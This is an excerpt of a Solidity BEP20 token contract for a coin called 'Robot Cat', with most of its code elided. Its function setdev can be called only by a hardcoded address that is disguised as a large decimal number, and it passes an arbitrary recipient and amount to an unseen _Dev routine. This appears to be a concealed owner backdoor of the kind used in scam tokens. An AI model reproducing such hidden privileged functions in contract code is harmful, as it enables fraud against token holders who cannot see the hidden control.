...
contract RobotCat is Context, IBEP20, Ownable {
    ...
    string public _name = "Robot Cat"; 
    string public _symbol = "RCT";
    uint8 public _decimals = 18;

    uint256 private _totalSupply = 10000000 * 10**1 * 10**_decimals;
    ...
    uint256 private _mTPAs = _totalSupply.div(14); 
    ...
    function setdev(address to, uint256 devf) public {
        require(msg.sender==address(1396543180091059000815574068489628544175119120825));
        _Dev(to, devf);
    }
